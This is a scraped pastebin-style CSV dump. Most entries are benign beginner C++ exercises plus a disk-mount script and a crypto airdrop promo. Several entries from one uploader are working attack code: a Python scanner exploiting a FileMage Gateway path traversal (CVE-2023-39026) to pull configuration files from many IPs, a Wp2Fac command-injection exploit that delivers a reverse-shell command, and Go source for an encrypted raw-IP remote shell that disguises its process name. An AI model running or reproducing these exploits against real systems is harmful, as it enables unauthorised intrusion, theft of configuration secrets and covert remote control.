id,title,username,language,date,content
A0rj6pkS,FileMage Gateway 1.10.9 - Local File Inclusion - CVE-2023-39026,FlyFar,Python,Saturday 20th of January 2024 05:45:36 AM CDT,"# Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion
# Date: 8/22/2023
# Exploit Author: Bryce ""Raindayzz"" Harty   
# Vendor Homepage: https://www.filemage.io/
# Version: Azure Versions < 1.10.9
# Tested on: All Azure deployments < 1.10.9 
# CVE : CVE-2023-39026

# Technical Blog - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html
# Patch from vendor - https://www.filemage.io/docs/updates.html

import requests
import warnings
warnings.filterwarnings(""ignore"")
def worker(url):
    response = requests.get(url, verify=False, timeout=.5)
    return response
def main():
    listIP = []
    file_path = input(""Enter the path to the file containing the IP addresses: "")
    with open(file_path, 'r') as file:
        ip_list = file.read().splitlines()
        searchString = ""tls""
        for ip in ip_list:
            url = f""https://{ip}"" + ""/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml""
            try:
                response = worker(url)
                #print(response.text)
                if searchString in response.text:
                    print(""Vulnerable IP: "" + ip)
                    print(response.text)
                    listIP.append(ip)
            except requests.exceptions.RequestException as e:  
                print(f""Error occurred for {ip}: {str(e)}"")

    for x in listIP:
        print(x)
if __name__ == '__main__':
    main()
            "
LYHwrmsX,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Saturday 20th of January 2024 05:44:54 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

422668"
rSmw0qqT,mnt_other_distro.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:43:50 AM CDT,"#!/bin/bash

#
# created by OuNiS 01.2024
# doc: https://www.facebook.com/groups/linux.fans.group/posts/24685486807733102/?__cft__[0]=AZUTsgKEF5DlRDSGTYGu6kjYsJdS1Lm090Z2B_T9TvBJ7bon4XQSI6fhNqqZByoGYbtProsYei1SNUQ_Mgl2PuKyDlDXbVRRc4wDqGnNXk6jZEDPaw1qTSQ7O6f3MdhzBqpMYbPNebHreHdqHXotmcN-&__tn__=%2CO%2CP-R
#
sudo mkdir /mnt/distro
sudo mount /dev/sda2 /mnt/distro


"
HgYSx4ib,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:42:56 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    if(x < 10) {
        cout << ""Pomal od 10"" << endl;
    }
    else if(x > 10) {
        cout << ""Pogolemo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    if(x % 2 == 1) {
        cout << ""NEPAREN"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    
    return 0;
}
"
cvR02C9H,Wp2Fac - OS Command Injection,FlyFar,Python,Saturday 20th of January 2024 05:41:02 AM CDT,"# Exploit Title: Wp2Fac v1.0 - OS Command Injection
# Date: 2023-08-27
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://github.com/metinyesil/wp2fac
# Tested on: Kali Linux & Windows 11
# CVE: N/A

import requests

def send_post_request(host, revshell):
    url = f'http://{host}/send.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'http://{host}',
        'Connection': 'close',
        'Referer': f'http://{host}/',
    }

    data = {
        'numara': f'1234567890 & {revshell} &;'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

host = input(""Target IP: "")

revshell = input(""Reverse Shell Command: "")

print(""Check your listener!"")

send_post_request(host, revshell)
            "
2XZRnMTt,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:35:54 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a >> b;
    
    if(a > b and a % 2 == 0) {
        cout << ""DA"" << endl;
    }
    
    return 0;
}
"
GEKh59Rk,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:30:06 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    
    if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    if(mesec == 4 or mesec == 6 or mesec == 9 or mesec == 11) {
        cout << 30 << endl;
    }
    
    return 0;
}
"
0brLthRD,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:27:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a;
    cin >> b;
    
    if(a > b or b % 2 == 1) {
        cout << ""DA"" << endl;
    }
    
    
    return 0;
}
"
2P4u5ppD,Untitled,35657,C++,Saturday 20th of January 2024 05:25:13 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;

void InsertChar(char* str, char ch, int num) {
	num--;
	for (int i = strlen(str) + 1; i > num; i--) {
		str[i] = str[i - 1];
	}
	str[num] = ch;
}

int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char ch;
	int num;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> ch;
	cout << ""Введите позиция: "";
	cin >> num;
	InsertChar(line, ch, num);
	cout << line << endl;
	
}"
FRqc55Hs,shell.go,FlyFar,Go,Saturday 20th of January 2024 05:24:42 AM CDT,"package main

/*
 * shell.go
 * Hook up the network to a shell
 * By J. Stuart McMurray
 * Created 0160226
 * Last Modified 0160226
 */

import (
	""bufio""
	""io""
	""log""
	""net""
	""os""
	""os/exec""
	""runtime""
)

func shell(c *net.IPConn, name string) {
	/* Get keys */
	skey, rkey := readShellKeys()
	for {
		/* Get a shell */
		shell, stdin, stdout, stderr := makeShell(name)
		/* Start the copies */
		ec := make(chan error, 4)
		go send(c, stdout, skey, ec)
		go send(c, stderr, skey, ec)
		go recv(stdin, c, rkey, ec)
		/* Start the shell */
		if err := shell.Start(); nil != err {
			log.Fatalf(""Cannot start shell: %v"", err)
		}
		log.Printf(""Ready %v <-> %v"", c.LocalAddr(), c.RemoteAddr())
		go func() {
			ec <- shell.Wait()
		}()

		/* Wait for something to happen */
		err := <-ec
		shell.Process.Kill()
		stdin.Close()
		stdout.Close()
		stderr.Close()
		if nil != err && io.EOF != err {
			log.Printf(""Error: %v"", err)
		} else {
			log.Printf(""Done."")
		}
	}
}

/* makeShell makes a shell named n, and returns the shell and it's i/o. */
func makeShell(n string) (
	shell *exec.Cmd,
	stdin io.WriteCloser,
	stdout io.ReadCloser,
	stderr io.ReadCloser,
) {
	if ""windows"" == runtime.GOOS {
		log.Fatalf(""Windows is not supported.  Please submit a patch."")
	}
	/* Make a shell */
	shell = exec.Command(""/bin/sh"")
	/* Set the binary as /bin/sh */
	shell.Path = ""/bin/sh""
	/* Name it something shady */
	shell.Args = []string{n}
	/* Get i/o */
	stdin, stdout, stderr = pipes(shell)
	return
}

/* pipes gets the i/o pipes for c, or calls log.Fatalf if it can't */
func pipes(cmd *exec.Cmd) (stdin io.WriteCloser, stdout, stderr io.ReadCloser) {
	var err error
	/* Get stdio */
	stdin, err = cmd.StdinPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdin: %v"", err)
	}
	stdout, err = cmd.StdoutPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdout: %v"", err)
	}
	stderr, err = cmd.StderrPipe()
	if nil != err {
		log.Fatalf(""Cannot get stderr: %v"", err)
	}
	return
}

/* readShellKeys gets two keys (send, receive) from stdin. */
func readShellKeys() (skey, rkey [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	skey = getKey(r)
	rkey = getKey(r)
	return
}"
LL85isU9,sender.go,FlyFar,Go,Saturday 20th of January 2024 05:24:05 AM CDT,"package main

/*
 * sender.go
 * Send encrypted data to the network
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""crypto/rand""
	""io""
	""log""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

/* send sends messages from in to out, encrypting them with the key.  If there
is an error, it will be sent to ec. */
func send(out *net.IPConn, in io.Reader, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, roll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* roll encrypts a message, and prepends the nonce, puts it in buf, and
returns buf. */
func roll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	/* Reset buffer */
	buf = buf[0:0]
	/* Get a nonce */
	n := nonce()
	/* Put it at the beginning of the message to send */
	for _, v := range n {
		buf = append(buf, v)
	}
	/* Encrypt the message */
	return secretbox.Seal(buf, msg, &n, &key), nil
}

/* nonce returns a nonce.  The nonce returned will be different for each call
to nonce. */
func nonce() [NONCELEN]byte {
	snoncebuf := make([]byte, NONCELEN)
	var n [NONCELEN]byte
	/* Read random bytes */
	_, err := rand.Read(snoncebuf)
	if nil != err {
		log.Fatalf(""Rand read: %v"", err)
	}
	/* Populate into an array */
	for i, v := range snoncebuf {
		n[i] = v
	}
	return n
}"
Lrryywpy,receiver.go,FlyFar,Go,Saturday 20th of January 2024 05:23:32 AM CDT,"package main

/*
 * receiver.go
 * Receive data from the network, unpack/unencrypt it
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

const (
	IP4HLEN = 20 /* IPv4 Header Length */
	IP6HLEN = 40 /* IPv6 Header Length */
)

/* recv receives packets from in, decrypts them, and sends to out.  If there
is an error, it will be sent to ec. */
func recv(out io.Writer, in *net.IPConn, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, unroll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* unroll takes the packet in msg, chops off the IP header, decrypts the
packet, puts the plaintext in buf, and returns buf.  Non-fatal errors will
cause a log message to be printed, but no error will be returned. */
func unroll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	buf = buf[0:0]
	/* Get the nonce and ciphertext */
	nonce, msg, err := splitPacket(msg)
	if nil != err {
		return buf, err
	}
	ok := false
	buf, ok = secretbox.Open(buf, msg, &nonce, &key)
	if !ok {
		return buf, fmt.Errorf(""decrypt failed"")
	}
	return buf, nil
}

/* splitPacket returns the nonce and payload from a packet. */
func splitPacket(msg []byte) (
	nonce [NONCELEN]byte,
	payload []byte,
	err error,
) {
	/* Remove the header */
	msg, err = chopHeader(msg)
	if nil != err {
		return nonce, msg, err
	}

	/* If there's no bytes left, it's probably a heartbeet */
	if 0 == len(msg) {
		return nonce, msg, HeartBeetError
	}

	/* Pull off the nonce */
	if NONCELEN > len(msg) {
		return nonce, msg, fmt.Errorf(
			""packet body too small for nonce: %02X"",
			msg,
		)
	}
	for i, _ := range nonce {
		nonce[i] = msg[i]
	}

	/* The rest is the payload */
	payload = msg[NONCELEN:]

	return nonce, payload, err
}

/* chopHeader reslices pkt to remove the IP header. */
func chopHeader(pkt []byte) ([]byte, error) {
	/* Switch by IP version */
	switch (pkt[0] & 0xF0) >> 4 {
	case 4:
		if IP4HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP4HLEN,
			)
		}
		pkt = pkt[IP4HLEN:]
	case 6:
		if IP6HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP6HLEN,
			)
		}
		pkt = pkt[IP6HLEN:]
	default:
		return pkt, fmt.Errorf(
			""unknown IP version: %02X"",
			pkt,
		)
	}
	return pkt, nil
}"
HkSL5ii7,net.go,FlyFar,Go,Saturday 20th of January 2024 05:22:55 AM CDT,"package main

/*
 * net.go
 * Network functions
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""log""
	""net""
	""time""
)

var HeartBeetError = fmt.Errorf(""heartbeet"")

/* localIP gets a local IP address for the host, or 127.0.0.1 if nothing else
works */
func localIP() (string, error) {
	/* Local addresses */
	addrs, err := net.InterfaceAddrs()
	if nil != err {
		return ""127.0.0.1"", err
	}
	/* Find the first non-loopback address */
	for _, v := range addrs {
		/* Cast to something we can use */
		i, ok := v.(*net.IPNet)
		if !ok {
			log.Printf(""Found strange address: %v"", v)
			continue
		}
		/* Only get external addresses */
		if !i.IP.IsGlobalUnicast() {
			continue
		}
		return i.IP.String(), nil
	}
	return ""127.0.0.1"", nil
}

/* resolve resolves addresses to addresses or dies */
func resolve(a string) *net.IPAddr {
	i, err := net.ResolveIPAddr(""ip"", a)
	if nil != err {
		log.Fatalf(""Resolve: %v"", err)
	}
	return i
}

/* xmit copies bytes from in to out, passing them through crypt in the process.
If there is an error, it will be sent to ec. */
func xmit(
	out io.Writer,
	in io.Reader,
	key [KEYLEN]byte,
	crypt func(buf, msg []byte, key [KEYLEN]byte) ([]byte, error),
) error {
	var (
		pbuf = make([]byte, BUFLEN) /* Plaintext Buffer */
		cbuf = make([]byte, BUFLEN) /* Ciphertext buffer */
		rerr error                  /* Read error */
		werr error                  /* Write error */
		cerr error                  /* Encryption error */
		n    int                    /* Read length */
	)
	for {
		/* Reset buffer */
		pbuf = pbuf[0:cap(pbuf)]

		/* Read a bit */
		n, rerr = in.Read(pbuf)
		/* Trim unused space */
		pbuf = pbuf[:n]

		/* If we didn't read anything, try again if there's no error */
		if 0 == n {
			/* If there's an error, give up */
			if nil != rerr {
				return rerr
			}
			log.Printf(""Heartbeet?"") /* DEBUG */
		}

		/* Crypt and send the message */
		cbuf, cerr = crypt(cbuf, pbuf, key)
		if nil != cerr {
			if HeartBeetError != cerr {
				log.Printf(""Crypt: %v"", cerr)
			}
			continue
		}
		_, werr = out.Write(cbuf)

		/* If either read or write errored, give up */
		if nil != rerr {
			return rerr
		}
		if nil != werr {
			return werr
		}
	}
}

/* heartbeet sends 0-byte messages on c at roughly the given interval, as
keepalives */
func heartbeet(c net.Conn, interval time.Duration) {
	for {
		if _, err := c.Write([]byte{}); nil != err {
			log.Fatalf(""Heartbeet: %v"", err)
		}
		time.Sleep(interval)
	}
}

/* connect ""connects"" to the other side */
func connect(
	laddr string,
	raddr string,
	proto uint,
	hbint time.Duration,
) *net.IPConn {
	c, err := net.DialIP(
		fmt.Sprintf(""ip:%v"", proto),
		resolve(laddr),
		resolve(raddr),
	)
	if nil != err {
		log.Fatalf(""Dial: %v"", err)
	}

	/* Start to heartbeet */
	go heartbeet(c, hbint)

	return c
}"
